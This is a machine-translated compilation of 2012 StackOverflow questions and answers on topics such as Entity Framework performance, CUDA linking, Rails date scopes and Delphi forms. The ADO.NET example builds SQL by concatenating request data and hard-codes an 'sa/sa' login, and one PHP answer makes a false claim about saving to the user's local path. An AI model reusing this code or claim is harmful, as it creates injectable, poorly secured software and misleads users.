# StackOverflow 问答 11751000-11751999

# c# - 是什么导致 EF 插入比普通 ADO.NET 慢得多？

> ID：11751006
> 
> 赞同：13
> 
> 时间：2012-08-01T00:35:47.937
> 
> 标签：c#, asp.net, .net, entity-framework

我必须在数据库中记录 Web 服务调用。一开始，我使用code first EF来定义Entity类并生成数据库脚本。数据库部分很简单，只有一张表。有一个主键：Id，其他列是字符串、日期时间和浮点数。总共16列。

然后我跑了VS2012的性能分析。报告显示 RecordUsageEF 消耗了整个调用的一半时间，这很荒谬。我尝试了 MergeOption.NoTracking 选项和预生成视图（[如何：预生成视图以提高查询性能](http://msdn.microsoft.com/en-us/library/bb896240.aspx)）。但他们并没有太大帮助。

然后我尝试了 Ado.net。我将 sql 脚本放在源代码中只是为了测试。一起调用 2 个方法来比较性能。

```
 public static void RecordUsage(HttpContext httpContext, XmlWDCRecipe processedRecipe, string orgRecipe, string userName, ActionEnum action, bool trueview, string pageId)
    {                                                                                               
        RecordUsageEF(httpContext, processedRecipe, orgRecipe, userName, action, trueview, pageId);
        RecordUsageADO(httpContext, processedRecipe, orgRecipe, userName, action, trueview, pageId);
    } 
```

结果让我吃惊：
![在此处输入图像描述](../Images/99cfd1ed9179d59aa34ae472d40a2e8f.png)

**使用静态 EF 上下文**更新改进了一些：**
![在此处输入图像描述](../Images/ba351cac1dad29650363a15ab20bfc74.png)**

 **RecordUsageEF 内部：
![在此处输入图像描述](../Images/0d5f47c97b9723465b11f7de16d589d5.png)

**更新**了 RecordUsageEF 内部——静态上下文
![在此处输入图像描述](../Images/06b087b3f3ceb3584faa4063e4fc0ca6.png)

**更新刚刚实现默认性能是CPU采样，这里是选择Instrumentation时的结果**
![在此处输入图像描述](../Images/d98758221effd136681a789e9a856cde.png)

**还不错，但如果 CPU 是网站/网络服务的瓶颈。EF看起来不是很好的选择。**

我在 sql profiler 中检查了 EF 生成的脚本。这是一个非常简单的插入 sql 语句，它比 Ado.net 运行得更快。

EF有什么我错过的吗？如果它在这种性能级别，我不能使用 EF。

这是源代码。
**英孚版：**

```
public static readonly LogContainer container = new LogContainer();

private static void RecordUsageEF(HttpContext httpContext, XmlWDCRecipe processedRecipe, string orgRecipe, string userName, ActionEnum action, bool trueview, string pageId)
    {
        {
            container.Usages.MergeOption = System.Data.Objects.MergeOption.NoTracking;
            using (LookupService ls = new LookupService(httpContext.Server.MapPath(geoDBLocation), LookupService.GEOIP_MEMORY_CACHE))
            {
                //get country of the ip address
                Location location = s.getLocation(httpContext.Request.UserHostAddress);

                Usage usage = new Usage()
                {
                    Brand = brand,
                    Action = action.ToString(),
                    ExecuteDate = DateTime.Now,
                    OutputFormat = trueview ? Path.GetExtension(processedRecipe.Output.trueview_file) : Path.GetExtension(processedRecipe.Output.design_file),
                    Recipe = orgRecipe,
                    SessionId = pageId,
                    Username = userName,
                    ClientIP = httpContext.Request.UserHostAddress,
                    ClientCountry = location == null ? null : location.countryName,
                    ClientState = location == null ? null : location.regionName,
                    ClientCity = location == null ? null : location.city,
                    ClientPostcode = location == null ? null : location.postalCode,
                    ClientLatitude = location == null ? null : (double?)location.latitude,
                    ClientLongitude = location == null ? null : (double?)location.longitude,
                    UserAgent = httpContext.Request.UserAgent
                };

                //container.AddToUsages(usage);
                container.Usages.AddObject(usage);                   
                container.SaveChanges(System.Data.Objects.SaveOptions.None);
            }
        }     
    } 
```

EF 设置为默认值：
![在此处输入图像描述](../Images/4912298b0372dff1df285769fc3d9f9e.png)

**ado.net 版本：**

```
 private static void RecordUsageADO(HttpContext httpContext, XmlWDCRecipe processedRecipe, string orgRecipe, string userName, ActionEnum action, bool trueview, string pageId)
    {
        using (SqlConnection conn = new SqlConnection("data source=pgo_swsvr;initial catalog=OESDWebSizer;user id=sa;password=sa;MultipleActiveResultSets=True;"))
        {

            using (LookupService ls = new LookupService(httpContext.Server.MapPath(geoDBLocation), LookupService.GEOIP_MEMORY_CACHE))
            {
                //get country of the ip address
                //test using "203.110.131.5"  "58.63.236.236"
                //httpContext.Request.UserHostAddress
                Location location = ls.getLocation(httpContext.Request.UserHostAddress);

                SqlCommand command = new SqlCommand();
                conn.Open();
                command.Connection = conn;
                command.CommandType = System.Data.CommandType.Text;
                command.CommandText = @"insert into Usages ([Brand],[Username],[SessionId],[Action],[Recipe],[ExecuteDate]
                                       ,[OutputFormat],[ClientIP],[ClientCountry],[ClientState],[ClientCity],[ClientPostcode]
                                       ,[ClientLatitude],[ClientLongitude],[UserAgent])
                                        Values ('" + brand + "'," 
                                        + (string.IsNullOrEmpty(userName) ? "NULL" : "'" + userName + "'") + ", '" + pageId + "', '" + action.ToString() + "', '" + orgRecipe + "', '" + DateTime.Now.ToString("yyyyMMdd") + "', '"
                                        + (trueview ? Path.GetExtension(processedRecipe.Output.trueview_file) : Path.GetExtension(processedRecipe.Output.design_file)) + "', '"
                                        + httpContext.Request.UserHostAddress + "', '"
                                        + (location == null ? string.Empty : location.countryName) + "', '"
                                        + (location == null ? string.Empty : location.regionName) + "', '"
                                        + (location == null ? string.Empty : location.city) + "', '"
                                        + (location == null ? string.Empty : location.postalCode) + "', "
                                        + (location == null ? 0 : (double?)location.latitude) + ", "
                                        + (location == null ? 0 : (double?)location.longitude) + ", '"
                                        + httpContext.Request.UserAgent + "')";

                command.ExecuteNonQuery();

            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T16:04:54.083

实体框架将许多细节抽象为（某些）CPU 性能的成本。Microsoft 有一篇文章详细介绍了性能注意事项： [Performance Considerations (Entity Framework)](http://msdn.microsoft.com/en-us/library/cc853327.aspx "性能注意事项（实体框架）")

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T02:04:45.213

我最熟悉代码优先的处理方式，但是如果您的容器对象是 DbContext，则以下内容应该会显着提高插入性能：

```
container.Configuration.AutoDetectChangesEnabled = false;
container.Configuration.ValidateOnSaveEnabled = false; 
```**

# comet - Bayeux 协议以及它如何支持在单个浏览器中打开的多个选项卡

> ID：11751008
> 
> 赞同：2
> 
> 时间：2012-08-01T00:35:50.483
> 
> 标签：comet, bayeux

我的问题是关于 Bayeux 协议如何使在单个浏览器中打开多个选项卡成为可能。如果我们也使用发布/订阅范式，我们需要向服务器发送订阅请求，那么该连接会打开吗？如果打开，那么它如何防止连接限制。如果未打开连接，那么服务器如何将数据发送到多个选项卡。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T07:17:14.470

更新的 Bayeux 规范位于[http://docs.cometd.org/reference/#bayeux](http://docs.cometd.org/reference/#bayeux)。

在[http://docs.cometd.org/reference/#java_server_multiple_sessions](http://docs.cometd.org/reference/#java_server_multiple_sessions)的 CometD 参考中讨论了来自同一浏览器的多个客户端的处理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T00:44:29.587

建议 HTTP 标准连接限制为 2，但这只是一个建议。没有现代浏览器实际上施加了 2 个连接限制。

然而，为了解决这个问题，Bayeux 协议还建议应用程序使用 cookie 来检测何时打开了多个选项卡并提示用户关闭除一个以外的所有选项卡。

> [http://svn.cometd.com/trunk/bayeux/bayeux.html](http://svn.cometd.com/trunk/bayeux/bayeux.html)
> 
> 建议 Bayeux 客户端实现使用客户端持久性或 cookie 来检测在同一 HTTP 客户端中运行的多个 Bayeux 客户端实例。一旦检测到，用户可以选择断开除一个客户端之外的所有客户端。客户端实现可以使用客户端持久性来共享 Bayeux 客户端实例。

# cuda - CUDA 编译错误 - 需要在链接器中添加“包含”

> ID：11751009
> 
> 赞同：0
> 
> 时间：2012-08-01T00:36:10.623
> 
> 标签：cuda, gpu, gpgpu, prng

我正在尝试使用 CUDA 编译器编译此代码：

```
#include <stdio.h>
#include <stdlib.h>
#include <cuda.h>
#include <curand.h>

int main(void)
{
    size_t n = 100;
    size_t i;
    int *hostData;
    unsigned int *devData;
    hostData = (int *)calloc(n, sizeof(int));
    curandGenerator_t gen;
    curandCreateGenerator(&gen, CURAND_RNG_PSEUDO_DEFAULT);
    curandSetPseudoRandomGeneratorSeed(gen, 12345);
    cudaMalloc((void **)&devData, n * sizeof(int));
    curandGenerate(gen, devData, n);
    cudaMemcpy(hostData, devData, n * sizeof(int), cudaMemcpyDeviceToHost);
    for(i = 0; i < n; i++)
    {
        printf("%d ", hostData[i]);
    }
    printf("\n");
    curandDestroyGenerator (gen);
    cudaFree ( devData );
    free ( hostData );
    return 0;
} 
```

通过使用此命令：

```
nvcc -o RNG RNG7.cu 
```

这是我收到的输出：

```
[root@client2 CUDA]$ nvcc -o RNG7 RNG7.cu
/tmp/tmpxft_00001ed1_00000000-13_RNG7.o: In function `main':
tmpxft_00001ed1_00000000-1_RNG7.cudafe1.cpp:(.text+0x6c): undefined reference to `curandCreateGenerator'
tmpxft_00001ed1_00000000-1_RNG7.cudafe1.cpp:(.text+0x7a): undefined reference to `curandSetPseudoRandomGeneratorSeed'
tmpxft_00001ed1_00000000-1_RNG7.cudafe1.cpp:(.text+0xa0): undefined reference to `curandGenerate'
tmpxft_00001ed1_00000000-1_RNG7.cudafe1.cpp:(.text+0x107): undefined reference to `curandDestroyGenerator'
collect2: ld returned 1 exit status 
```

在另一个讨论中，他们表示这个问题可能与链接器问题或其他问题有关，我需要在编译器命令中手动链接库以包含我的代码中所述的库。

我不知道要做到这一点，有人可以帮忙吗？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-08-02T19:08:21.847

使用以下选项。

```
nvcc -o RNG7 RNG7.cu -lcurand -Xlinker=-rpath,/usr/local/cuda/lib 
```

它会像魅力一样起作用。

# ios - iOS（sim）文件二进制读取最后会出现乱码

> ID：11751010
> 
> 赞同：0
> 
> 时间：2012-08-01T00:36:15.117
> 
> 标签：ios, file, memory, binary

我使用这个例程进行从文件到内存的二进制读取，直到现在都运行良好......至少在 iOS 上，在模拟器中（......没有付费的开发人员程序（还;）））

数字，例如 fileSize，bytesRead 是可以的，但它在最后给出了乱码......

我不能覆盖内存，因为我立即进行输出......

然后我认为这可能是对齐边界问题，例如 fileSize % 4 = det。胡言乱语。但这将是一种奇怪的行为，函数获取大小和计数，lib 应该计算在后台读取的多字节，所以这不应该导致问题......

这是我使用的代码：

```
uint8_t *readFileToMemory(FILE *fp)
{
    fseek(fp, 0, SEEK_END);
    long fileSize = ftell(fp);
    rewind(fp);
    //
    printf("fileSize %lu bytes\n",fileSize);
    //
    uint8_t *fileData = NULL;
    //
    fileData = (uint8_t *)requestMemory(fileData, (MEM_TYPE_MEMSIZE)fileSize, BF_MEM_ZERO_NO, "readFileToMemory()");
    fread(fileData, 1, (size_t)fileSize, fp);
    //
    long sizeRead = fread(fileData, 1, (size_t)fileSize, fp);
    printf("sizeRead %lu bytes\n",sizeRead);
    //
    fclose(fp);
    //
    printf("+\n+\nfileData:\n%s+\n+\n",fileData);
    //
    return fileData;
} 
```

我发布这个问题的原因是“为什么胡言乱语？” 在 iOS-sim 上，我确实有一个简单的解决方法...

尼尔斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T12:59:52.730

我现在在这里，所以我不妨提供一个关闭的答案；）

在将二进制文件作为（c/glsl NULL-terminated）字符串传递之前，我忘记在二进制文件的末尾添加一个 '\0'...哎呀 :)

我感谢 borrrden 对 Apple libs binary-read 的评论，我仍然需要研究......（时间时间）

尼尔斯

# ruby-on-rails - 使用范围在 ActiveRecord 中的多个 DateTime 范围内返回结果

> ID：11751011
> 
> 赞同：5
> 
> 时间：2012-08-01T00:36:26.970
> 
> 标签：ruby-on-rails, ruby, datetime, activerecord, scopes

我有一个`Session`模型，它有一个`:created_at`日期和一个`:start_time`日期，两者都存储在数据库中`:time`。我目前正在一张巨大的桌子上吐出一堆结果，并允许用户使用范围按单个日期和可选的时间范围过滤结果，如下所示：

```
class Session < ActiveRecord::Base
  ...

  scope :filter_by_date, lambda { |date|
    date = date.split(",")[0]
    where(:created_at =>
      DateTime.strptime(date, '%m/%d/%Y')..DateTime.strptime(date, '%m/%d/%Y').end_of_day
    )
  }
  scope :filter_by_time, lambda { |date, time|
    to = time[:to]
    from = time[:from]
    where(:start_time =>
      DateTime.strptime("#{date} #{from[:digits]} #{from[:meridian]}", '%m/%d/%Y %r')..
      DateTime.strptime("#{date} #{to[:digits]} #{to[:meridian]}", '%m/%d/%Y %r')
    )
  }

end 
```

控制器看起来或多或少像这样：

```
class SessionController < ApplicationController

  def index
    if params.include?(:date) ||
       params.include?(:time) &&
     ( params[:time][:from][:digits].present? && params[:time][:to][:digits].present? )

      i = Session.scoped
      i = i.filter_by_date(params[:date]) unless params[:date].blank?
      i = i.filter_by_time(params[:date], params[:time]) unless params[:time].blank? || params[:time][:from][:digits].blank? || params[:time][:to][:digits].blank?

      @items = i
      @items.sort_by! &params[:sort].to_sym if params[:sort].present?
    else
      @items = Session.find(:all, :order => :created_at)
    end
  end

end 
```

我需要允许用户使用多个日期过滤结果。我将参数作为字符串格式的逗号分隔列表接收，例如`"07/12/2012,07/13/2012,07/17/2012"`，并且需要能够在数据库中查询几个不同的日期范围和这些日期范围内的时间范围，并合并这些结果，例如所有7/12、7/13 和 7/17 下午 6:30 至 7:30 之间的会议。

我一直在到处寻找并尝试了几种不同的方法，但我不知道如何实际做到这一点。这可以使用范围吗？如果不是，最好的方法是什么？

我最接近的猜测看起来像这样，但它没有返回任何东西，所以我知道这是错误的。

```
scope :filter_by_date, lambda { |date|
  date = date.split(",")
  date.each do |i|
    where(:created_at =>
      DateTime.strptime(i, '%m/%d/%Y')..DateTime.strptime(i, '%m/%d/%Y').end_of_day
    )
  end
}
scope :filter_by_time, lambda { |date, time|
  date = date.split(",")
  to = time[:to]
  from = time[:from]
  date.each do |i|
    where(:start_time =>
      DateTime.strptime("#{i} #{from[:digits]} #{from[:meridian]}", '%m/%d/%Y %r')..
      DateTime.strptime("#{i} #{to[:digits]} #{to[:meridian]}", '%m/%d/%Y %r')
    )
  end
} 
```

另一个复杂之处是开始时间都存储为 DateTime 对象，因此它们已经包含一个固定日期，所以如果我想返回在任何日期在下午 6:30 到晚上 7:30 之间开始的所有会话，我需要弄清楚其他事情也。第三方负责数据，因此我无法更改数据的结构或存储方式，我只需要弄清楚如何进行所有这些复杂的查询。请帮忙！

* * *

**编辑：**

这是我通过结合以下 Kenichi 和 Chuck Vose 的建议得出的解决方案：

```
scope :filter_by_date, lambda { |dates|
  clauses = []
  args = []
  dates.split(',').each do |date|
    m, d, y = date.split '/'
    b = "#{y}-#{m}-#{d} 00:00:00"
    e = "#{y}-#{m}-#{d} 23:59:59"
    clauses << '(created_at >= ? AND created_at <= ?)'
    args.push b, e
  end
  where clauses.join(' OR '), *args
}

scope :filter_by_time, lambda { |times|
  args = []
  [times[:from], times[:to]].each do |time|
    h, m, s = time[:digits].split(':')
    h = (h.to_i + 12).to_s if time[:meridian] == 'pm'
    h = '0' + h if h.length == 1
    s = '00' if s.nil?
    args.push "#{h}:#{m}:#{s}"
  end
  where("CAST(start_time AS TIME) >= ? AND
         CAST(start_time AS TIME) <= ?", *args)
} 
```

此解决方案允许我从多个不连续的日期返回会话，或者在完全不依赖日期的情况下返回一段时间内的任何会话，或者结合两个范围以按这些日期内的不连续日期和时间进行过滤。耶！

我忽略的一个重要点是该`where`语句必须放在最后——将它放在每个循环中不会返回任何内容。感谢你们俩的帮助！我现在感觉更聪明了。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T18:04:40.347

就像是：

```
scope :filter_by_date, lambda { |dates|
  clauses = []
  args = []
  dates.split(',').each do |date|
    m, d, y = date.split '/'
    b = "#{y}-#{m}-#{d} 00:00:00"
    e = "#{y}-#{m}-#{d} 23:59:59"
    clauses << '(start_time >= ? AND start_time <= ?)'
    args.push b, e
  end
  where clauses.join(' OR '), *args
} 
```

和

```
scope :filter_by_time, lambda { |dates, time|
  clauses = []
  args = []
  dates.split(',').each do |date|
    m, d, y = date.split '/'
    f = time[:from] # convert to '%H:%M:%S'
    t = time[:to]   # again, same
    b = "#{y}-#{m}-#{d} #{f}"
    e = "#{y}-#{m}-#{d} #{t}"
    clauses << '(start_time >= ? AND start_time <= ?)'
    args.push b, e
  end
  where clauses.join(' OR '), *args
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T17:07:53.713

因此，问题的简单部分是如何处理日期时间。DateTimes 的好处是可以很容易地将它们转换为时间：

```
CAST(datetime_col AS TIME) 
```

因此，您可以执行以下操作：

```
i.where("CAST(start_time AS TIME) IN(?)", times.join(", ")) 
```

现在，更难的部分，为什么你没有得到任何结果。首先要尝试的是使用`i.to_sql`来决定范围查询是否合理。我的猜测是，当您将其打印出来时，您会发现所有这些都与 AND 链接在一起。因此，您要查找日期为 7/12、7/13 和 7/21 的对象。

这里的最后一部分是你有几件事是有关的：sql 注入和一些过度的 strptimes。

当你做一个你不应该`#{}`在查询中使用的地方时。即使您知道您的同事的输入来自哪里，也可能不知道。因此，请确保您`?`像我上面所做的那样使用。

其次，strptime 在每种语言中都非常昂贵。你不应该知道这一点，但它是。如果尽可能避免解析日期，在这种情况下，您可能只需 gsub / into - 在那个日期，一切都会很愉快。无论如何，MySQL 都需要 m/d/y 形式的日期。如果你仍然遇到问题并且你真的需要一个 DateTime 对象，你可以很容易地做到：`Date.new(2001,2,3)`不吃你的 CPU。

# php - 如何将文件保存在上传文件的同一路径中，PHP？

> ID：11751012
> 
> 赞同：1
> 
> 时间：2012-08-01T00:36:28.533
> 
> 标签：php, forms, upload, path, watermark

使用PHP，我的概念是：用户通过提交表单上传图片，然后脚本覆盖logo水印。我想将修改后的图像保存到原始图像的相同位置（在用户的计算机上）。我的代码现在是这样的：

```
<form name="form1" method="post" action="watermark.php" enctype="multipart/form-data">

Select file:
<input type="file" name="uploadfile"/>
<input type="submit" value="submit">

</form> 
```

如何知道原始文件的路径以将修改后的图像保存在同一位置？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T00:40:20.177

您不能将其直接保存在用户的计算机上（使用 HTML），因为这将违反 - 一切。相反，您可以在修改后提供文件以供下载。前提是您使用 GD 进行水印，代码很简单（但并不完美，应该被认为只是一个线索）：

```
// perform some ops with $img

Header('Content-Type: image/jpeg');
Header('Content-Disposition: attachment; filename=' . $filename);

imagejpeg($img);

imagedestroy($img); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T01:16:08.973

这很简单。我已经做到了。当用户上传图片时，不只是获取图片，而是创建一个隐藏字段来存储整个路径。现在，要么将此路径留在用户 PC 上的 cookie 中，要么与您一起存储。在返回时，使用自定义的另存为对话框并将该路径插入文件之前。

# html - 我可以在导航元素中添加徽标图像吗？

> ID：11751017
> 
> 赞同：7
> 
> 时间：2012-08-01T00:37:24.913
> 
> 标签：html, semantic-markup, nav

为了编写语义和实体标记，我可以将徽标图像放置在导航元素内吗？就在 ul 元素之前。

```
<nav>
    <img id="logo" />
    <ul>
        <li>a</li>
        <li>b</li>
    </ul>
</nav> 
```

或者我应该将它全部包装在另一个元素中，如下所示：

```
<section id="navigation">
    <img id="logo" />
    <nav>
        <ul>
            <li>a</li>
            <li>b</li>
        </ul>
    </nav>
</section> 
```

我更喜欢第一个来最小化标记。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-09T15:10:22.930

我只会在`nav`if ... 中插入图像</p>

*   …此图像链接到页面/锚点（例如，首页链接），或
*   …此图像包含文本“导航”或类似文本（因此应插入 a `h1`）

[规范](http://www.w3.org/TR/html5/the-nav-element.html#the-nav-element)说：

> 该`nav`元素表示链接到其他页面或页面内的部分的页面部分：具有导航链接的部分。

因此，本节不应包含与导航无关的内容。

你的第二个例子不是你想要的，因为你会创建一个错误的大纲（因为 external `section`）。

如果它是页面的主导航并且图像是网站徽标，我会使用这个标记：

```
<header>

 <h1><a href="index.html" title="Home page"><img src="logo.png" alt="ACME Inc."></a></h1>

 <nav>
   <ul>
     <li>a</li>
     <li>b</li>
   </ul>
 </nav>

</header> 
```

如果您想将徽标链接到主页*并且*主页未链接到 中`ul`，我会将其插入`nav`：

```
<nav>
 <ul>
   <li><a href="index.html" title="Home page"><img src="logo.png" alt="ACME Inc."></a></li>
   <li>a</li>
   <li>b</li>
 </ul>
</nav> 
```

但这种情况很少见，因为您仍然需要一个页面标题，并且在大多数情况下这将是徽标，并且在大多数情况下应该链接到网站的主页。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-01T01:04:19.330

`<nav>`是的，在标签中放置图像没有问题。根据[MDN](https://developer.mozilla.org/en/HTML/Element/nav)和[W3C](http://dev.w3.org/html5/spec/Overview.html#the-nav-element)，流内容是此标签的允许内容，并且在许多其他元素中就是`<img>`标签。

# delphi - 尝试更改表单时出现程序错误

> ID：11751020
> 
> 赞同：0
> 
> 时间：2012-08-01T00:37:32.620
> 
> 标签：delphi, delphi-4

我首先创建了一个显示设置的表单。然后我创建了一个登录框，它将从 ini 文件中加载密码。本来以为是加载ini文件出错。尽管我在加载设置表单时已将其隔离。这是所有这些的代码。

设置屏幕的代码：

```
 unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, inifiles;

type

  TForm1 = class(TForm)
    SaveButton: TButton;
    AEditA: TEdit;
    AEditB: TEdit;
    SEditB: TEdit;
    PEditB: TEdit;
    PLabelA: TLabel;
    SLabelA: TLabel;
    ALabelA: TLabel;
    PEditA: TEdit;
    SEditA: TEdit;
    ExitButton: TButton;
    Settings: TLabel;
    ALabelB: TLabel;
    SLabelB: TLabel;
    PLabelB: TLabel;
    AReserveLabel: TLabel;
    BReserveLabel: TLabel;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    Label8: TLabel;
    Label7: TLabel;
    procedure SaveButtonClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure ExitButtonClick(Sender: TObject);
    procedure AEditAKeyPress(Sender: TObject; var Key: Char);
    procedure AEditBKeyPress(Sender: TObject; var Key: Char);
    procedure SEditAKeyPress(Sender: TObject; var Key: Char);
    procedure SEditBKeyPress(Sender: TObject; var Key: Char);
    procedure PEditAKeyPress(Sender: TObject; var Key: Char);
    procedure PEditBKeyPress(Sender: TObject; var Key: Char);

  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  IniFile : TIniFile;
  appINI : TIniFile;
  APriceA : String;
  SPriceA : String;
  PPriceA : String;
  APriceB : String;
  SPriceB : String;
  PPriceB : String;

implementation

{$R *.DFM}

procedure TForm1.SaveButtonClick(Sender: TObject);
//Save Button
 begin
  appINI := TIniFile.Create(ChangeFileExt(Application.ExeName,'.ini'));
  APriceA := (AEditA.Text);
  SPriceA := (SEditA.Text);
  PPriceA := (PEditA.Text);
  APriceB := (AEditB.Text);
  SPriceB := (SEditB.Text);
  PPriceB := (PEditB.Text);
  appINI.WriteString('PricesA','Adult',APriceA);
  appINI.WriteString('PricesA','Student',SPriceA);
  appINI.WriteString('PricesA','Pensioner',PPriceA);
  appINI.WriteString('PricesB','Adult',APriceB);
  appINI.WriteString('PricesB','Student',SPriceB);
  appINI.WriteString('PricesB','Pensioner',PPriceB);
  appINI.Free;
  ShowMessage('Settings Saved Successfully!');
 end;

procedure TForm1.FormCreate(Sender: TObject);
//Displays values as the form is created
begin
{ appINI := TIniFile.Create(ChangeFileExt(Application.ExeName,'.ini'));
APriceA := appINI.ReadString('PricesA','Adult','');
SPriceA := appINI.ReadString('PricesA','Student','');
PPriceA := appINI.ReadString('PricesA','Pensioner','');
APriceB := appINI.ReadString('PricesB','Adult','');
SPriceB := appINI.ReadString('PricesB','Student','');
PPriceB := appINI.ReadString('PricesB','Pensioner','');
appINI.Free;
AEditA.Text := (APriceA);
SEditA.Text := (SPriceA);
PEditA.Text := (PPriceA);
AEditB.Text := (APriceB);
SEditB.Text := (SPriceB);
PEditB.Text := (PPriceB);}
end;

procedure TForm1.ExitButtonClick(Sender: TObject);
//Exit Button
begin
Close;
end;

procedure TForm1.AEditAKeyPress(Sender: TObject; var Key: Char);
var s:string;
begin
  s := ('1234567890.'#8); //Add chars you want to allow
  if pos(key,s) =0 then begin
    Key:=#0;
    showmessage('Only Numbers are allowed. Include cents!');
  end;
end;

procedure TForm1.AEditBKeyPress(Sender: TObject; var Key: Char);
var s:string;
begin
  s := ('1234567890.'#8); //Add chars you want to allow
  if pos(key,s) =0 then begin
    Key:=#0;
    showmessage('Only Numbers are allowed. Include cents!');
  end;
end;

procedure TForm1.SEditAKeyPress(Sender: TObject; var Key: Char);
var s:string;
begin
  s := ('1234567890.'#8); //Add chars you want to allow
  if pos(key,s) =0 then begin
    Key:=#0;
    showmessage('Only Numbers are allowed. Include cents!');
  end;
end;

procedure TForm1.SEditBKeyPress(Sender: TObject; var Key: Char);
var s:string;
begin
  s := ('1234567890.'#8); //Add chars you want to allow
  if pos(key,s) =0 then begin
    Key:=#0;
    showmessage('Only Numbers are allowed. Include cents!');
  end;
end;

procedure TForm1.PEditAKeyPress(Sender: TObject; var Key: Char);
var s:string;
begin
  s := ('1234567890.'#8); //Add chars you want to allow
  if pos(key,s) =0 then begin
    Key:=#0;
    showmessage('Only Numbers are allowed. Include cents!');
  end;
end;

procedure TForm1.PEditBKeyPress(Sender: TObject; var Key: Char);
var s:string;
begin
  s := ('1234567890.'#8); //Add chars you want to allow
  if pos(key,s) =0 then begin
    Key:=#0;
    showmessage('Only Numbers are allowed. Include cents!');
  end;
end;
//End of Settings
end. 
```

登录表单的代码：

```
unit Unit2;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, Mask, inifiles, Unit1;

type
  TForm2 = class(TForm)
    PassEdit: TMaskEdit;
    LoginButton: TButton;
    PassLabel: TLabel;
    InvisiButton: TButton;
    procedure PassEditClick(Sender: TObject);
    procedure LoginButtonClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form2: TForm2;
  IniFile : TIniFile;
  appINI : TIniFile;
  Password : string;

implementation

{$R *.DFM}

procedure TForm2.PassEditClick(Sender: TObject);
begin
PassEdit.Text := '';
end;

procedure TForm2.LoginButtonClick(Sender: TObject);
begin
//if Password = PassEdit.Text then begin
Form2.Hide;
showmessage('test');
Form1.Show;
end;
//end;
procedure TForm2.FormCreate(Sender: TObject);
begin
appINI := TIniFile.Create(ChangeFileExt(Application.ExeName,'.ini'));
Password := appINI.ReadString('Login','Password','');
ShowMessage(Password);
appINI.Free;
end;

end. 
```

这是项目：

```
program Project1;

uses
  Forms,
  Unit1 in 'Unit1.pas' {Form1},
  Unit2 in 'Unit2.pas' {Form2};

{$R *.RES}

begin
  Application.Initialize;
  //Application.CreateForm(TForm1, Form1);
  Application.CreateForm(TForm2, Form2);
  Application.Run;
end. 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T01:16:45.390

您已注释掉`.dpr file that creates`Form1` 中的代码行：

```
 //Application.CreateForm(TForm1, Form1); 
```

但是您正在访问该未创建的表单`Unit1`：

```
procedure TForm2.LoginButtonClick(Sender: TObject);
begin
//if Password = PassEdit.Text then begin
Form2.Hide;
showmessage('test');
Form1.Show;        // <-- Accessing uncreated form here
end; 
```

取消注释项目文件中的行，以便创建它。请注意，创建的*第一个*表单将`Application.CreateForm`成为您的应用程序的主表单，当该表单关闭时，您的应用程序将终止。

您的代码中还有另一个重大缺陷。您永远不应该从它自己的方法之一中按名称引用表单本身，就像您在此处从 inside 所做的那样`TForm2.LoginButtonClick`：

```
 Form2.Hide; 
```

`TForm2`这意味着如果您重命名表单，它将无法编译，并且如果您创建多个现在有）。您应该直接使用表单的方法，例如`Hide;' from the method, or use`Self.Hide;` 来引用当前运行该方法的实例。

（供将来参考：当您遇到问题时，如果您在寻求帮助解决问题时解释该问题是什么，这会有所帮助。没有关于错误的其他信息的“程序错误”本身是没有意义的。当您键入“错误”时，接下来您应该添加的是您遇到的确切错误，包括**确切****的**错误消息，包括任何地址信息。我们无法从我们所在的位置看到您的屏幕，因此我们只有您提供给我们的信息通过帮助你。）

# android - Android：AndEngine像素完美碰撞GLES2？

> ID：11751024
> 
> 赞同：1
> 
> 时间：2012-08-01T00:37:37.953
> 
> 标签：android, collision-detection, andengine

我正在使用 AndEngine 来实现 2d 游戏，我现在想知道是否实际上已经为 AndEngine **GLES2**实现了像素完美碰撞检测库/扩展/ ...。我已经搜索了好几个小时了，一无所获。请不要向我推荐[这个](https://github.com/m5/andengine-pixel-perfect)，因为我已经尝试过了，它只适用于**GLES1**。如果真的没有任何已经存在的工作，我接受任何想法来实现它 - 尽管我选择了 AndEngine 进行像素完美碰撞，但这是个坏主意 -

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T06:28:27.943

## **AndEngine 碰撞扩展：**

[https://github.com/MakersF/AndEngineCollisionsExtension](https://github.com/MakersF/AndEngineCollisionsExtension) 这是一个扩展，旨在为 AndEngine GLES2 带来不同的碰撞方法（完美或近似）

## **支持的碰撞方法：**

Pixel-Perfect Collision（支持：平移、缩放、旋转、螺旋） 它还支持像素完美形状和矩形形状之间的像素完美碰撞，而不需要后者是像素完美形状。不同于 0 的 Alpha 值（您设置识别像素是否为实心的阈值）您可以使用 Utils 方法检查应用程序中的性能或输出碰撞掩码以检查它是否是您需要的

# ruby-on-rails - Rails ActiveRecord::Base 在哪里定义哈希构造函数？

> ID：11751026
> 
> 赞同：0
> 
> 时间：2012-08-01T00:37:45.100
> 
> 标签：ruby-on-rails, hash, constructor

